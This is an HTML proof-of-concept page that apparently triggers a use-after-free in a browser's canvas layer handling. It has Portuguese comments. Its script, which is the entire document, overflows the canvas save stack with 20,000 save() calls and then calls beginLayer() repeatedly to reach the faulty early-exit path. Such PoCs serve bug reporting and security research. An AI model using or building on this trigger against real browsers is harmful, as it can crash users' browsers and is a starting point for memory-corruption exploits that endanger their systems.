
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - Canvas Layer UAF (e055837)</title>
</head>
<body>
<script>
const canvas = document.createElement('canvas');
canvas.width = 200;
canvas.height = 200;
canvas.style.cssText = 'position:absolute;left:-9999px';
document.body.appendChild(canvas);

const ctx = canvas.getContext('2d');

// Estoura o limite de saves da pilha (MaxSaveCount)
for (let i = 0; i < 20000; i++) {
    ctx.save();
}

// Dispara o beginLayer com a pilha travada no limite, 
// forçando o cenário de early exit e o UAF de camadas.
ctx.beginLayer();
ctx.beginLayer();
ctx.beginLayer();
</script>
</body>
</html>
